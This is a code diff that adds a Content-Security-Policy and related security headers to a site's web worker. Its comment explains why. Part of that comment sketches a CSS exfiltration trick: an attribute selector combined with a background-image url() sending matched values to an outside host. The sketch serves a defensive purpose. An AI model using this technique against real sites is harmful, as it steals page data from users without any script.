@@ -460,11 +460,59 @@ body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.45 ui-sans-serif,
     // every /theorem/enumeration_hex4_<hex> door; this looks the key up and renders, the same lookup the
     // catalogue already pays for packages. Named theorems stay VitePress assets — theoremPage returns null
     // for them, so a rebuilt SSG page is never shadowed.
+    /** THE POLICY EVERY ANSWER LEAVES WITH — and CSS is most of why it exists.
+     *
+     *  A STYLESHEET IS AN EXFILTRATION CHANNEL, not only a decoration. Injected CSS needs no JavaScript to steal:
+     *  an attribute selector plus `background-image: url(https://elsewhere/?k=...)` sends a value out on the strength
+     *  of the browser matching a rule. This site was already immune to that by CONSTRUCTION — measured on the live
+     *  stylesheet 2026-09-20, all 32 url() are same-origin self-hosted fonts, there is no @import, there is no
+     *  :visited rule, and the served HTML carries no inline <style> at all — and immune by nothing at ALL that a
+     *  browser enforces, because not one security header was set on any route. A posture held by convention is a
+     *  posture one careless render loses. style-src 'self' with img-src limited to self, data: and blob: closes the
+     *  channel outright: an injected <style> never parses and an injected url() never leaves.
+     *
+     *  WHAT IS HONEST ABOUT script-src. Three inline <script> blocks ship on every SSG page and their content
+     *  differs per page, so they cannot be hashed centrally and a static asset cannot carry a nonce. script-src
+     *  therefore still admits 'unsafe-inline' and is the one weak leg of this policy; every other directive binds.
+     *  It is named here rather than left for a reader to discover.
+     *
+     *  THE REST IS MEASURED, NOT COPIED. style-src-attr admits 'unsafe-inline' because the pages render 39 style
+     *  attributes; img-src and media-src admit blob: because five components mint object URLs; connect-src is
+     *  'self' because no component fetches an off-origin target. HSTS is deliberately NOT set: it is a commitment a
+     *  browser remembers and this tree does not get to make it on the owner's behalf. */
+    const POLICY = [
+      "default-src 'self'",
+      "base-uri 'self'",
+      "object-src 'none'",
+      "frame-ancestors 'self'",
+      "form-action 'self'",
+      "style-src 'self'",
+      "style-src-attr 'unsafe-inline'",
+      "font-src 'self'",
+      "img-src 'self' data: blob:",
+      "media-src 'self' data: blob:",
+      "connect-src 'self'",
+      "script-src 'self' 'unsafe-inline'",
+    ].join('; ')
+
+    /** every answer this worker gives, wearing the same policy — one place, so no route can be served without it */
+    const secured = (h) => {
+      h.set('content-security-policy', POLICY)
+      // the browser must not sniff past a declared type — the media type IS the contract, which this tree spent a
+      // day proving at its own MCP doors, and sniffing is exactly what unmakes it
+      h.set('x-content-type-options', 'nosniff')
+      h.set('x-frame-options', 'SAMEORIGIN')
+      // a theorem URL is a content address; a full-URL referrer hands it to every outbound link's host
+      h.set('referrer-policy', 'strict-origin-when-cross-origin')
+      h.set('permissions-policy', 'camera=(), microphone=(), geolocation=(), payment=(), usb=()')
+      return h
+    }
+
     /** ONE WAY TO SERVE A BUILT FILE. The theorem route below and the tail of this handler both answer with a static
      *  asset, and a file answered twice is a file that can be answered two different ways; this is the single place
      *  that decides the headers a built page leaves with. */
     const servedAsset = (asset, forPath) => {
-      const built = new Headers(asset.headers)
+      const built = secured(new Headers(asset.headers))
       built.set('link', `<${url.origin}/mcp>; rel="mcp"`)
       built.set('cache-control', assetCacheControl(forPath))
       return new Response(asset.body, { status: asset.status, statusText: asset.statusText, headers: built })
@@ -487,7 +535,7 @@ body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.45 ui-sans-serif,
       const page = theoremPage(thMatch[1])
       if (page) {
         return new Response(renderTheoremPage(page), {
-          headers: { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'public, max-age=3600, must-revalidate' },
+          headers: secured(new Headers({ 'content-type': 'text/html; charset=utf-8', 'cache-control': 'public, max-age=3600, must-revalidate' })),
         })
       }
     }
